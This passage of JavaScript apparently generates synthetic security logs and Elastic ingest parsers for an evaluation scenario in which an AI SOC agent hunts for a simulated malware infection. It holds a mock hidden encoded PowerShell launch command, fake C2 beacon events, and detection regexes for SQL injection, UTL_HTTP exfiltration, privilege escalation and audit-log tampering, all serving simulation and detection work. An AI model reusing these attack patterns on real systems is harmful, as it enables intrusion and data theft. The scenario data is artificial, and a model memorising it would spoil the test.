    host:{name:host.name,hostname:host.name,ip:[host.ip],os:{name:'Windows 10',family:'windows'}},
    user:{name:host.user,domain:'CONTOSO'},
    process:{
      name:ctx.malwareFile,pid,
      executable:`C:\\ProgramData\\Intel\\${ctx.malwareFile}`,
      command_line:`"C:\\ProgramData\\Intel\\${ctx.malwareFile}" -silent`,
      hash:{sha256:ctx.malwareHash},
      parent:{name:'powershell.exe',pid:parentPid,command_line:'powershell.exe -nop -w hidden -enc SQBFAFgA...'},
    },
    // Populated so agent can find this by querying process.hash.sha256 or process.name
    related:{user:[host.user],hash:[ctx.malwareHash]},
  });

  const epC2=(host,pid,dstIp,t)=>JSON.stringify({
    '@timestamp':formatTimestamp(t),
    event:{kind:'event',category:['network'],type:['connection'],action:'network_flow'},
    host:{name:host.name,hostname:host.name,ip:[host.ip]},
    source:{ip:host.ip,port:randomHighPort()},
    destination:{ip:dstIp,port:443,address:dstIp,domain:ctx.c2Domain},
    network:{transport:'tcp',direction:'outbound',bytes:rand(4096,65536)},
    // Fixed PID — matches the process creation event above, enabling pivot
    process:{name:ctx.malwareFile,pid,executable:`C:\\ProgramData\\Intel\\${ctx.malwareFile}`},
    user:{name:host.user},
    threat:{enrichments:[{indicator:{ip:dstIp,domain:ctx.c2Domain,type:'domain-name',provider:'CISA'}}]},
    related:{ip:[host.ip,dstIp],user:[host.user]},
  });

  // Victim: process creation first, then multiple outbound beacons with same PID
  logs.endpoint.push(epProcessCreate(victim,victimPid,victimParentPid,new Date(from.getTime()+rand(0,Math.floor(span*0.1)))));
  logs.endpoint.push(epC2(victim,victimPid,ctx.c2IP,rndTs()));
  logs.endpoint.push(epC2(victim,victimPid,ctx.c2IP,rndTs()));
  logs.endpoint.push(epC2(victim,victimPid,ctx.c2IP2,rndTs()));

  // Other hosts: each gets its own process creation + network event pair
  otherHosts.forEach((h,i)=>{
    const pid=otherPids[i],parentPid=rand(32001,65000);
    logs.endpoint.push(epProcessCreate(h,pid,parentPid,new Date(from.getTime()+rand(0,Math.floor(span*0.15)))));
    logs.endpoint.push(epC2(h,pid,ctx.c2IP,rndTs()));
  });

  // ── Windows DNS-Client/Operational Event 22 ──
  // Event ID 22 = DNS Query Response Completed — maps domain → IP in the log corpus
  // so the SOC agent can resolve C2 domains without relying on external DNS tools.
  const dnsQueryLog=(host,domain,resolvedIp,t)=>JSON.stringify({
    '@timestamp':formatTimestamp(t),
    winlog:{
      event_id:22,
      channel:'Microsoft-Windows-DNS-Client/Operational',
      computer_name:`${host.name}.contoso.com`,
      provider_name:'Microsoft-Windows-DNS-Client',
      record_id:rand(10000,9999999),
      event_data:{QueryName:domain,QueryResults:`type:  1 ${resolvedIp};`,QueryOptions:'1073774080'},
    },
    event:{code:'22',action:'dns-query-response',category:['network'],type:['info'],kind:'event',outcome:'success'},
    host:{name:host.name,hostname:host.name,ip:[host.ip]},
    // ECS dns fields — directly queryable by the agent
    dns:{
      question:{name:domain,type:'A',registered_domain:domain.split('.').slice(-2).join('.')},
      answers:[{name:domain,data:resolvedIp,type:'A',ttl:300}],
      resolved_ip:[resolvedIp],
      response_code:'NOERROR',
    },
    // Also populate destination so firewall-style queries match
    destination:{ip:resolvedIp,address:resolvedIp},
    related:{hosts:[domain],ip:[resolvedIp,host.ip]},
    user:{name:host.user},
  });

  // Victim resolves both C2 domain and phishing domain
  logs.windows.push(dnsQueryLog(victim,ctx.c2Domain,ctx.c2IP,rndTs()));
  logs.windows.push(dnsQueryLog(victim,ctx.phishingDomain,ctx.attacker?.ip||ctx.c2IP,rndTs()));
  // Other compromised hosts also resolve the same C2 domain (corroborates lateral reach)
  otherHosts.forEach(h=>logs.windows.push(dnsQueryLog(h,ctx.c2Domain,ctx.c2IP,rndTs())));

  return logs;
}

// ─── Elastic Config ───────────────────────────────────────────────────────────
const STORAGE_KEY='elastic_config_forge';
function loadConfig(){try{return JSON.parse(localStorage.getItem(STORAGE_KEY)||'null');}catch{return null;}}
function saveConfig(c){localStorage.setItem(STORAGE_KEY,JSON.stringify(c));}
function buildHeaders(cfg){return {'Content-Type':'application/x-ndjson','Authorization':`ApiKey ${cfg.apiKey}`};}

// ─── elasticIngest ────────────────────────────────────────────────────────────
function agentField(type){return{type,version:'8.13.0',ephemeral_id:Math.random().toString(36).slice(2)};}
function dsField(dataset){return{type:'logs',dataset,namespace:'default'};}
const VENDOR_INGEST={
  fortinet:{getIndex(l){if(l.includes('type="utm"'))return'logs-fortinet.fortigate.utm-default';if(l.includes('subtype="vpn"'))return'logs-fortinet.fortigate.event-default';return'logs-fortinet.fortigate.traffic-default';},toDoc(l){
    const ds=l.includes('type="utm"')?'fortinet.fortigate.utm':l.includes('subtype="vpn"')?'fortinet.fortigate.event':'fortinet.fortigate.traffic';
    const et=l.match(/eventtime=(\d+)/);
    const ts=et?new Date(parseInt(et[1])*1000).toISOString():new Date().toISOString();
    // Parse all key=value pairs (quoted and unquoted) into a flat map
    const kv={};
    l.replace(/(\w+)="([^"]*)"/g,(_,k,v)=>{kv[k]=v;});
    l.replace(/(?:^|\s)(\w+)=([^\s"]+)/g,(_,k,v)=>{if(!kv[k])kv[k]=v;});
    const srcIp=kv.srcip,dstIp=kv.dstip,hostname=kv.hostname;
    return{
      '@timestamp':ts,message:l,
      event:{dataset:ds,module:'fortinet',kind:'event',action:kv.action,outcome:kv.action==='accept'||kv.action==='allow'?'success':'failure',original:l},
      observer:{vendor:'Fortinet',product:'FortiGate',type:'firewall'},
      ...(srcIp?{source:{ip:srcIp,address:srcIp,...(kv.srcport?{port:parseInt(kv.srcport)}:{})}}:{}),
      ...(dstIp?{destination:{ip:dstIp,address:hostname||dstIp,...(kv.dstport?{port:parseInt(kv.dstport)}:{}),...(hostname?{domain:hostname}:{}),...(kv.dstcountry?{geo:{country_name:kv.dstcountry}}:{})}}:{}),
      ...(kv.user?{user:{name:kv.user}}:{}),
      network:{transport:'tcp',...(kv.app?{application:kv.app}:{})},
      agent:agentField('filebeat'),data_stream:dsField(ds),
    };
  }},
  paloalto:{getIndex(){return'logs-panw.panos-5.5.0';},toDoc(l){
    const cols=l.split(',');
    // cols[0]=syslog_hdr+FUTURE_USE(1), cols[1]=recv_time, cols[2]=serial, cols[3]=type
    // cols[7]=src_ip, cols[8]=dst_ip, cols[12]=src_user, cols[24]=src_port, cols[25]=dst_port
    const lt=cols[3]||'TRAFFIC';
    let ts=new Date().toISOString();
    if(cols[1]){const m=cols[1].trim().match(/^(\d{4})\/(\d{2})\/(\d{2}) (\d{2}):(\d{2}):(\d{2})$/);if(m)ts=new Date(`${m[1]}-${m[2]}-${m[3]}T${m[4]}:${m[5]}:${m[6]}Z`).toISOString();}
    const srcIp=cols[7]?.trim(),dstIp=cols[8]?.trim();
    const srcPort=cols[24]?parseInt(cols[24]):undefined,dstPort=cols[25]?parseInt(cols[25]):undefined;
    const srcUser=(cols[12]?.trim()||'').replace(/^,+|,+$/g,'')||undefined;
    return{
      '@timestamp':ts,message:l,
      event:{dataset:'panw.panos',module:'panw',kind:lt==='THREAT'?'alert':'event',original:l},
      observer:{vendor:'Palo Alto Networks',product:'PAN-OS',type:'firewall'},
      ...(srcIp&&srcIp!=='0.0.0.0'?{source:{ip:srcIp,address:srcIp,...(srcPort?{port:srcPort}:{})}}:{}),
      ...(dstIp&&dstIp!=='0.0.0.0'?{destination:{ip:dstIp,address:dstIp,...(dstPort?{port:dstPort}:{})}}:{}),
      ...(srcUser?{user:{name:srcUser}}:{}),
      network:{transport:cols[29]?.trim()||'tcp'},
      agent:agentField('filebeat'),data_stream:dsField('panw.panos'),
    };
  }},
  switch:{getIndex(){return'logs-cisco.ios-default';},toDoc(l){const tm=l.match(/>(\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})/);const ts=tm?parseSyslogTs(tm[1],new Date().getUTCFullYear()).toISOString():new Date().toISOString();return{'@timestamp':ts,message:l,event:{dataset:'cisco.ios',module:'cisco',kind:'event',original:l},observer:{vendor:'Cisco',product:'Catalyst IOS',type:'switch'},agent:agentField('filebeat'),data_stream:dsField('cisco.ios')};}},
  email:{
    getIndex(l){if(l.trimStart().startsWith('{'))return'logs-o365.audit-default';if(l.includes('postfix/')||l.includes('NOQUEUE'))return'logs-system.syslog-default';return'logs-microsoft_exchange_server.log-default';},
    toDoc(l){
      // ── O365 Audit JSON ──
      // {"CreationTime":"...","Operation":"Send","Workload":"Exchange","ClientIP":"...","UserId":"user@domain","ResultStatus":"Succeeded"}
      if(l.trimStart().startsWith('{')){
        try{
          const o=JSON.parse(l);
          const userId=o.UserId||'';
          const outcome=o.ResultStatus==='Succeeded'||o.ResultStatus==='Success'?'success':'failure';
          const category=o.Workload==='SharePoint'?['file','web']:o.Workload==='AzureActiveDirectory'?['authentication','iam']:['email'];
          return{
            '@timestamp':o.CreationTime||new Date().toISOString(),message:l,
            event:{dataset:'o365.audit',module:'o365',kind:'event',action:o.Operation,category,outcome,provider:o.Workload,original:l},
            user:{name:userId,email:userId},
            source:{ip:o.ClientIP,address:o.ClientIP},
            o365:{audit:{
              Operation:o.Operation,
              Workload:o.Workload,
              UserId:userId,
              ClientIP:o.ClientIP,
              ResultStatus:o.ResultStatus,
              ...(o.ObjectId?{ObjectId:o.ObjectId}:{}),
              ...(o.Parameters?{Parameters:o.Parameters}:{}),
              ...(o.RuleOperation?{RuleOperation:o.RuleOperation}:{}),
              ...(o.LogonError?{LogonError:o.LogonError}:{}),
            }},
            agent:agentField('filebeat'),data_stream:dsField('o365.audit'),
          };
        }catch{}
      }

      // ── Postfix MTA ──
      // sent:   "Jan  5 10:30:00 mail-gw-1.domain postfix/smtp[1234]: QUEUEID: to=<user@domain>, relay=mx[1.2.3.4]:25, status=sent"
      // reject: "Jan  5 10:30:00 mail-gw-1.domain postfix/smtpd[1234]: NOQUEUE: reject: RCPT from unknown[1.2.3.4]: 554 ..."
      if(l.includes('postfix/')||l.includes('NOQUEUE')){
        const tm=l.match(/^(\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})/);
        const ts=tm?parseSyslogTs(tm[1],new Date().getUTCFullYear()).toISOString():new Date().toISOString();
        const host=l.match(/^\S+\s+\S+\s+(\S+)\s+postfix/)?.[1];
        const pid=l.match(/postfix\/\w+\[(\d+)\]/)?.[1];
        const proc=l.match(/postfix\/(\w+)/)?.[1];
        const toAddr=l.match(/to=<([^>]+)>/)?.[1];
        const rejectIp=l.match(/from\s+unknown\[([^\]]+)\]/)?.[1];
        const status=l.match(/status=(\w+)/)?.[1];
        const isReject=l.includes('NOQUEUE');
        return{
          '@timestamp':ts,message:l,
          event:{dataset:'system.syslog',module:'system',kind:'event',category:['email'],action:isReject?'email-rejected':'email-delivery',outcome:status==='sent'?'success':isReject?'failure':'unknown',original:l},
          ...(host?{host:{name:host,hostname:host}}:{}),
          process:{name:`postfix/${proc||'smtp'}`,...(pid?{pid:parseInt(pid)}:{})},
          ...(toAddr?{email:{to:{address:toAddr}}}:{}),
          ...(rejectIp?{source:{ip:rejectIp,address:rejectIp}}:{}),
          agent:agentField('filebeat'),data_stream:dsField('system.syslog'),
        };
      }

      // ── Exchange tracking log (CSV) ──
      // "2024-01-05T10:30:00Z,<msgid@domain>,ACTION,from@domain,to@domain,"Subject",Direction,Verdict,Disposition,SCL:n,Size:n"
      const ex=l.match(/^([^,]+),(<[^>]*>),([^,]+),([^,]+),([^,]+),"([^"]*)",([^,]+),([^,]+),([^,]+),SCL:(\d+),Size:(\d+)/);
      if(ex){
        const [,isoTs,msgId,action,fromAddr,toAddr,subject,direction,verdict,disposition,,size]=ex;
        const isClean=verdict==='Clean';
        return{
          '@timestamp':isoTs,message:l,
          event:{dataset:'microsoft_exchange_server.log',module:'microsoft_exchange_server',kind:'event',category:['email'],action:action.toLowerCase(),outcome:disposition==='Deliver'?'success':'failure',original:l},
          email:{
            message_id:msgId,
            from:{address:fromAddr},
            to:{address:toAddr},
            subject,
            direction:direction.toLowerCase(),
            attachments:[],
          },
          network:{bytes:parseInt(size)},
          // Phishing/BEC verdicts surfaced as threat fields for SOC queries
          ...(!isClean?{threat:{indicator:{type:'email',provider:'exchange-hygiene'}},tags:[`email-${verdict.toLowerCase()}`]}:{tags:[]}),
          agent:agentField('filebeat'),data_stream:dsField('microsoft_exchange_server.log'),
        };
      }

      // fallback
      return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'microsoft_exchange_server.log',module:'microsoft_exchange_server',category:['email'],original:l},agent:agentField('filebeat'),data_stream:dsField('microsoft_exchange_server.log')};
    }
  },
  endpoint:{getIndex(l){try{const o=JSON.parse(l);if(o.event?.kind==='alert')return'logs-endpoint.alerts-default';if((o.event?.category||[]).includes('network'))return'logs-endpoint.events.network-default';}catch{}return'logs-endpoint.events.process-default';},toDoc(l){try{const o=JSON.parse(l);const cats=o.event?.category||[];let ds='endpoint.events.process';if(o.event?.kind==='alert')ds='endpoint.alerts';else if(cats.includes('network'))ds='endpoint.events.network';return{...o,agent:{...o.agent,type:'endpoint'},data_stream:dsField(ds),event:{...o.event,dataset:ds,module:'endpoint'}};}catch{return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'endpoint.events.process'},agent:agentField('elastic_agent'),data_stream:dsField('endpoint.events.process')};}}},
  windows:{
    getIndex(l){try{const o=JSON.parse(l),ch=o.winlog?.channel||'';if(ch.includes('PowerShell'))return'logs-windows.powershell_operational-default';if(ch==='Security')return'logs-windows.security-default';if(ch==='Application')return'logs-windows.application-default';if(ch.includes('AppLocker'))return'logs-windows.applocker-default';return'logs-windows.system-default';}catch{return'logs-windows.system-default';}},
    toDoc(l){try{const o=JSON.parse(l);const ch=o.winlog?.channel||'System';let ds='windows.system';if(ch.includes('PowerShell'))ds='windows.powershell_operational';else if(ch==='Security')ds='windows.security';else if(ch==='Application')ds='windows.application';else if(ch.includes('AppLocker'))ds='windows.applocker';return{...o,event:{...o.event,dataset:ds,module:'windows'},agent:agentField('winlogbeat'),data_stream:dsField(ds)};}catch{return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'windows.system',module:'windows'},agent:agentField('winlogbeat'),data_stream:dsField('windows.system')};}}
  },
  linux:{
    getIndex(l){
      if(l.includes('sshd[')||l.includes('sudo[')||l.includes('sudo:')
        ||l.match(/\s(useradd|userdel|usermod|groupadd|groupdel|gpasswd|passwd|chage)\[/))
        return'logs-system.auth-default';
      if(l.includes('audit['))return'logs-auditd.log-default';
      return'logs-system.syslog-default';
    },
    toDoc(l){
      let ds='system.syslog';
      if(l.includes('sshd[')||l.includes('sudo[')||l.includes('sudo:')
        ||l.match(/\s(useradd|userdel|usermod|groupadd|groupdel|gpasswd|passwd|chage)\[/))
        ds='system.auth';
      else if(l.includes('audit['))ds='auditd.log';
      const tm=l.match(/^(\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})/);
      const ts=tm?parseSyslogTs(tm[1],new Date().getUTCFullYear()).toISOString():new Date().toISOString();
      const base={'@timestamp':ts,message:l,event:{dataset:ds,module:ds.split('.')[0],kind:'event',original:l},agent:agentField('filebeat'),data_stream:dsField(ds)};

      // ── SSH (sshd) ──
      // Accepted/Failed — capture method (password|publickey) explicitly
      const sshAuth=l.match(/^[\w\s:]+\s+(\S+)\s+sshd\[(\d+)\]:\s+(Accepted|Failed)\s+(password|publickey)\s+for\s+(?:invalid user\s+)?(\S+)\s+from\s+(\S+)\s+port\s+(\d+)/);
      if(sshAuth){
        const ok=sshAuth[3]==='Accepted',method=sshAuth[4],user=sshAuth[5],ip=sshAuth[6],port=parseInt(sshAuth[7]);
        const geo=ok?null:sshGeoFor(ip);
        return{...base,
          host:{name:sshAuth[1],hostname:sshAuth[1]},
          process:{name:'sshd',pid:parseInt(sshAuth[2])},
          user:{name:user},
          source:{ip,address:ip,port,...(geo?{geo}:{})},
          event:{...base.event,category:['authentication'],type:[ok?'start':'info'],action:ok?'ssh-login':'ssh-login-failure',outcome:ok?'success':'failure'},
          system:{auth:{ssh:{event:sshAuth[3],method,ip,port},user}},
        };
      }
      // session opened/closed
      const sshSess=l.match(/^[\w\s:]+\s+(\S+)\s+sshd\[(\d+)\]:\s+session (opened|closed) for user (\S+)/);
      if(sshSess){
        const opened=sshSess[3]==='opened',user=sshSess[4];
        return{...base,
          host:{name:sshSess[1],hostname:sshSess[1]},
          process:{name:'sshd',pid:parseInt(sshSess[2])},
          user:{name:user},
          event:{...base.event,category:['authentication','session'],type:[opened?'start':'end'],action:opened?'ssh-session-opened':'ssh-session-closed',outcome:'success'},
          system:{auth:{ssh:{event:opened?'Opened':'Closed'},user}},
        };
      }
      // max auth attempts / disconnect / connection closed
      const sshMisc=l.match(/^[\w\s:]+\s+(\S+)\s+sshd\[(\d+)\]:.+?(?:from|by)\s+(?:authenticating user \S+ )?(\d+\.\d+\.\d+\.\d+)/);
      if(sshMisc&&(l.includes('maximum authentication')||l.includes('Disconnected')||l.includes('Connection closed'))){
        const miscIp=sshMisc[3],miscGeo=sshGeoFor(miscIp);
        return{...base,
          host:{name:sshMisc[1],hostname:sshMisc[1]},
          process:{name:'sshd',pid:parseInt(sshMisc[2])},
          source:{ip:miscIp,address:miscIp,...(miscGeo?{geo:miscGeo}:{})},
          event:{...base.event,category:['authentication'],type:['info'],action:'ssh-disconnect',outcome:l.includes('maximum')?'failure':'unknown'},
          system:{auth:{ssh:{event:l.includes('maximum')?'MaxAuthAttempts':'Disconnected',ip:miscIp}}},
        };
      }

      // ── sudo ──
      // success: "host sudo[pid]: user : TTY=pts/0 ; PWD=... ; USER=root ; COMMAND=..."
      // failure: "host sudo: user : NOT in sudoers / command not allowed ; ..."
      const sudo=l.match(/^[\w\s:]+\s+(\S+)\s+sudo(?:\[\d+\])?:\s+(\S+)\s+:(.+?)COMMAND=(.+)$/);
      if(sudo){
        const fail=l.includes('NOT in sudoers')||l.includes('not allowed');
        const cmd=sudo[4]?.trim(),tty=l.match(/TTY=(\S+)/)?.[1]||'pts/0',user=sudo[2];
        const errMsg=l.includes('NOT in sudoers')?'user is not in the sudoers file':l.includes('not allowed')?'command not allowed':undefined;
        return{...base,
          host:{name:sudo[1],hostname:sudo[1]},
          process:{name:'sudo',command_line:cmd},
          user:{name:user,target:{name:'root'}},
          event:{...base.event,category:['process','iam'],type:['start'],action:'sudo',outcome:fail?'failure':'success'},
          system:{auth:{sudo:{user,command:cmd,tty,...(errMsg?{error:errMsg}:{})},user}},
        };
      }

      // ── User / Group management ──
      const useradd=l.match(/(\S+)\s+useradd\[(\d+)\]:\s+new user:\s+name=([^,]+),\s*UID=(\d+),\s*GID=(\d+),\s*home=([^,]+),\s*shell=(\S+)/);
      if(useradd) return{...base,host:{name:useradd[1],hostname:useradd[1]},process:{name:'useradd',pid:parseInt(useradd[2])},user:{name:useradd[3],id:useradd[4],target:{name:useradd[3]}},group:{id:useradd[5]},event:{...base.event,category:['iam'],type:['user','creation'],action:'user-created',outcome:'success'},system:{auth:{useradd:{name:useradd[3],uid:useradd[4],gid:useradd[5],home:useradd[6],shell:useradd[7]},user:'root'}}};

      const userdel=l.match(/(\S+)\s+userdel\[(\d+)\]:\s+delete user '([^']+)'/);
      if(userdel) return{...base,host:{name:userdel[1],hostname:userdel[1]},process:{name:'userdel',pid:parseInt(userdel[2])},user:{name:userdel[3],target:{name:userdel[3]}},event:{...base.event,category:['iam'],type:['user','deletion'],action:'user-deleted',outcome:'success'},system:{auth:{useradd:{name:userdel[3]},user:'root'}}};

      const usermod=l.match(/(\S+)\s+usermod\[(\d+)\]:\s+(?:change user '([^']+)'|add '([^']+)' to shadow group '([^']+)')/);
      if(usermod) return{...base,host:{name:usermod[1],hostname:usermod[1]},process:{name:'usermod',pid:parseInt(usermod[2])},user:{name:usermod[3]||usermod[4],target:{name:usermod[3]||usermod[4]}},group:{name:usermod[5]},event:{...base.event,category:['iam'],type:['user','change'],action:'user-modified',outcome:'success'},system:{auth:{useradd:{name:usermod[3]||usermod[4]},user:'root'}}};

      const gpasswdAdd=l.match(/(\S+)\s+gpasswd\[(\d+)\]:\s+user (\S+) added by (\S+) to group (\S+)/);
      if(gpasswdAdd) return{...base,host:{name:gpasswdAdd[1],hostname:gpasswdAdd[1]},process:{name:'gpasswd',pid:parseInt(gpasswdAdd[2])},user:{name:gpasswdAdd[4],target:{name:gpasswdAdd[3]}},group:{name:gpasswdAdd[5]},event:{...base.event,category:['iam'],type:['group','change'],action:'user-added-to-group',outcome:'success'},system:{auth:{groupadd:{name:gpasswdAdd[5]},user:gpasswdAdd[4]}}};

      const gpasswdRem=l.match(/(\S+)\s+gpasswd\[(\d+)\]:\s+user (\S+) removed by (\S+) from group (\S+)/);
      if(gpasswdRem) return{...base,host:{name:gpasswdRem[1],hostname:gpasswdRem[1]},process:{name:'gpasswd',pid:parseInt(gpasswdRem[2])},user:{name:gpasswdRem[4],target:{name:gpasswdRem[3]}},group:{name:gpasswdRem[5]},event:{...base.event,category:['iam'],type:['group','change'],action:'user-removed-from-group',outcome:'success'},system:{auth:{groupadd:{name:gpasswdRem[5]},user:gpasswdRem[4]}}};

      const groupadd=l.match(/(\S+)\s+groupadd\[(\d+)\]:\s+new group:\s+name=([^,]+),\s*GID=(\d+)/);
      if(groupadd) return{...base,host:{name:groupadd[1],hostname:groupadd[1]},process:{name:'groupadd',pid:parseInt(groupadd[2])},group:{name:groupadd[3],id:groupadd[4]},event:{...base.event,category:['iam'],type:['group','creation'],action:'group-created',outcome:'success'},system:{auth:{groupadd:{name:groupadd[3],gid:groupadd[4]},user:'root'}}};

      const groupdel=l.match(/(\S+)\s+groupdel\[(\d+)\]:\s+removed group '([^']+)'/);
      if(groupdel) return{...base,host:{name:groupdel[1],hostname:groupdel[1]},process:{name:'groupdel',pid:parseInt(groupdel[2])},group:{name:groupdel[3]},event:{...base.event,category:['iam'],type:['group','deletion'],action:'group-deleted',outcome:'success'},system:{auth:{groupadd:{name:groupdel[3]},user:'root'}}};

      const pwchange=l.match(/(\S+)\s+(passwd|chage)\[(\d+)\]:\s+(?:password changed|changed password expiry) for (\S+)/);
      if(pwchange) return{...base,host:{name:pwchange[1],hostname:pwchange[1]},process:{name:pwchange[2],pid:parseInt(pwchange[3])},user:{name:pwchange[4],target:{name:pwchange[4]}},event:{...base.event,category:['iam'],type:['user','change'],action:'password-changed',outcome:'success'},system:{auth:{useradd:{name:pwchange[4]},user:'root'}}};

      // ── auditd ──
      // "Jan  5 10:30:00 host audit[123]: type=SYSCALL msg=audit(1234.567:89): ... pid=456 uid=1000 exe="/usr/bin/curl""
      const aud=l.match(/^[\w\s:]+\s+(\S+)\s+audit\[(\d+)\]:.*?pid=(\d+).*?uid=(\d+).*?exe="([^"]+)"/);
      if(aud){
        return{...base,
          host:{name:aud[1],hostname:aud[1]},
          process:{name:aud[5].split('/').pop(),pid:parseInt(aud[3]),executable:aud[5]},
          user:{id:aud[4]},
          event:{...base.event,category:['process'],type:['info'],action:'syscall'},
        };
      }

      // ── cron ──
      // "Jan  5 10:30:00 host CRON[1234]: (root) CMD (/usr/local/bin/backup.sh)"
      const cron=l.match(/^[\w\s:]+\s+(\S+)\s+CRON\[(\d+)\]:\s+\((\S+)\)\s+CMD\s+\((.+)\)$/);
      if(cron){
        return{...base,
          host:{name:cron[1],hostname:cron[1]},
          process:{name:'cron',pid:parseInt(cron[2]),command_line:cron[4]},
          user:{name:cron[3]},
          event:{...base.event,category:['process'],type:['start'],action:'cron-job'},
        };
      }

      // ── fallback: extract at least host and process from syslog header ──
      const hdr=l.match(/^[\w\s:]+\s+(\S+)\s+(\S+?)(?:\[(\d+)\])?:/);
      if(hdr)return{...base,host:{name:hdr[1],hostname:hdr[1]},process:{name:hdr[2],...(hdr[3]?{pid:parseInt(hdr[3])}:{})}};
      return base;
    }
  },
  oracle:{
    getIndex(l){
      if(l.trimStart().startsWith('{')){try{const o=JSON.parse(l);if(o.event?.kind==='metric')return'metrics-oracle.performance-default';}catch{}}
      return'logs-oracle.audit-default';
    },
    toDoc(l){
      // ── Metrics ──
      if(l.trimStart().startsWith('{')){
        try{const o=JSON.parse(l);if(o.event?.kind==='metric'){const{module:_m,...evt}=o.event||{};return{...o,event:evt,agent:agentField('metricbeat'),data_stream:{type:'metrics',dataset:'oracle.performance',namespace:'default'}};}}catch{}
      }
      // ── Alert log (multi-line joined with \n) ──
      if(l.includes('\nThread ')||l.includes('\nORA-')){
        const lines=l.split('\n'),ts=lines[0]||new Date().toISOString(),body=lines.slice(1).join(' ');
        const oraM=body.match(/(ORA-\d{5})/);
        const doc={'@timestamp':ts,message:l,
          event:{dataset:'oracle.audit',module:'oracle',kind:'event',category:['database'],action:oraM?'database-error':'log-switch',outcome:oraM?'failure':'success',original:l},
          oracle:{audit:{db_user:'SYSTEM',userhost:'oracle-db-internal',privilege:'SYSDBA',return_code:oraM?oraM[1]:'0',statement_type:'INTERNAL',length:'200',session_id:String(rand(1000,99999))}},
          agent:agentField('filebeat'),data_stream:dsField('oracle.audit')};
        if(oraM)doc.error={code:oraM[1],message:body};
        return doc;
      }
      // ── Listener → oracle.audit dataset ──
      if(l.match(/^\d{2}-[A-Z]{3}-\d{4}/)){
        const ipM=l.match(/HOST=(\d+\.\d+\.\d+\.\d+)/),portM=l.match(/\(PORT=(\d+)\)\) \*/),svcM=l.match(/SERVICE_NAME=([^)]+)/);
        const status=l.endsWith('* 0')?'success':'failure';
        const clientIp=ipM?ipM[1]:'';
        return{'@timestamp':new Date().toISOString(),message:l,
          event:{dataset:'oracle.audit',module:'oracle',kind:'event',category:['network','database'],action:'connect',outcome:status,original:l},
          oracle:{audit:{db_user:'',userhost:clientIp,privilege:'NONE',return_code:status==='success'?'0':'12170',statement_type:'CONNECT',length:'200',session_id:String(rand(1000,99999)),client:{user:'oracle',address:clientIp},entity:{name:svcM?svcM[1]:''}}},
          ...(clientIp?{source:{ip:clientIp,address:clientIp,...(portM?{port:parseInt(portM[1])}:{})}}:{}),
          destination:{port:1521},
          agent:agentField('filebeat'),data_stream:dsField('oracle.audit')};
      }
      // ── Audit (all types including security events) ──
      const tsM=l.match(/^([^\s]+\+\d{2}:\d{2})/),ts=tsM?tsM[1]:new Date().toISOString();
      const actionM=l.match(/ACTION\s*:\[\d+\]\s+"([^"]+)"/),userM=l.match(/DATABASE USER:\[\d+\]\s+"([^"]+)"/);
      const statusM=l.match(/STATUS:\[\d+\]\s+"([^"]+)"/),ipM=l.match(/HOST=(\d+\.\d+\.\d+\.\d+)/);
      const dbidM=l.match(/DBID:\[\d+\]\s+"([^"]+)"/),sqlM=l.match(/SQLTEXT:\[\d+\]\s+"([^"]+)"/);
      const hosthostM=l.match(/USERHOST:\[\d+\]\s+"([^"]+)"/),clientUserM=l.match(/CLIENT USER:\[\d+\]\s+"([^"]+)"/);
      const privM=l.match(/PRIVILEGE\s*:\[\d+\]\s+"([^"]+)"/);
      const sql=sqlM?.[1]||'',action=actionM?.[1]||'',returnCode=statusM?.[1]||'0';
      const stmtVerb=sql.match(/^\s*(SELECT|INSERT|UPDATE|DELETE|GRANT|CREATE|DROP|ALTER|EXECUTE|TRUNCATE|CALL)/i);
      const stmtType=stmtVerb?stmtVerb[1].toUpperCase():action.split(' ')[0].toUpperCase()||'SELECT';
      const entityName=sql.match(/(?:FROM|TABLE|INTO|UPDATE)\s+(\S+)/i)?.[1]?.replace(/[()]/g,'')||'';
      const isInjection=sql.match(/UNION\s+SELECT|OR\s+'?1'?='?1|--\s*$/i);
      const isRecon=sql.match(/DBA_USERS|V\$SESSION|DBA_ROLE_PRIVS|DBA_SYS_PRIVS|DBA_OBJECTS/i);
      const isPrivEsc=sql.match(/GRANT\s+DBA|GRANT\s+EXECUTE\s+ON\s+UTL|DBMS_SCHEDULER\.CREATE_JOB/i);
      const isExfil=sql.match(/UTL_HTTP\.REQUEST|UTL_FILE\.|UTL_ENCODE/i);
      const isLateral=sql.match(/CREATE\s+DATABASE\s+LINK/i);
      const isTamper=sql.match(/AUD\$|NOAUDIT|AUDIT_TRAIL=NONE|CLEAR_AUDIT_TRAIL/i);
      const cats=['database'];
      let tactic,technique;
      if(isInjection){cats.push('intrusion_detection');tactic='Initial Access';technique='Exploit Public-Facing Application';}
      else if(isExfil){cats.push('exfiltration');tactic='Exfiltration';technique='Exfiltration Over Web Service';}
      else if(isPrivEsc){cats.push('privilege_escalation');tactic='Privilege Escalation';technique='Abuse Elevation Control Mechanism';}
      else if(isRecon){cats.push('discovery');tactic='Discovery';technique='Permission Groups Discovery';}
      else if(isLateral){cats.push('lateral_movement');tactic='Lateral Movement';technique='Remote Services';}
      else if(isTamper){cats.push('defense_evasion');tactic='Defense Evasion';technique='Indicator Removal';}
      return{'@timestamp':ts,message:l,
        event:{dataset:'oracle.audit',module:'oracle',kind:'event',category:cats,action:action.toLowerCase()||'query',outcome:returnCode==='0'?'success':'failure',severity:isInjection||isExfil||isPrivEsc?73:isRecon||isLateral||isTamper?47:21,original:l},
        oracle:{audit:{db_user:userM?.[1]||'',userhost:hosthostM?.[1]||'',privilege:privM?.[1]||'NONE',return_code:returnCode,statement_type:stmtType,sql_text:sql,length:'200',session_id:String(rand(1000,99999)),...(dbidM?{db_id:dbidM[1]}:{}),...(clientUserM?{client:{user:clientUserM[1],address:ipM?.[1]||''}}:{}),...(entityName?{entity:{name:entityName}}:{})}},
        ...(userM?{user:{name:userM[1]}}:{}),
        ...(ipM?{source:{ip:ipM[1],address:ipM[1]}}:{}),
        ...(dbidM?{database:{instance:{name:dbidM[1]}}}:{}),
        ...(tactic?{threat:{framework:'MITRE ATT&CK',tactic:{name:tactic},technique:{name:technique}}}:{}),
        agent:agentField('filebeat'),data_stream:dsField('oracle.audit')};
    },
  },
  mssql:{
    getIndex(l){
      if(l.trimStart().startsWith('{')){
        try{
          const o=JSON.parse(l);
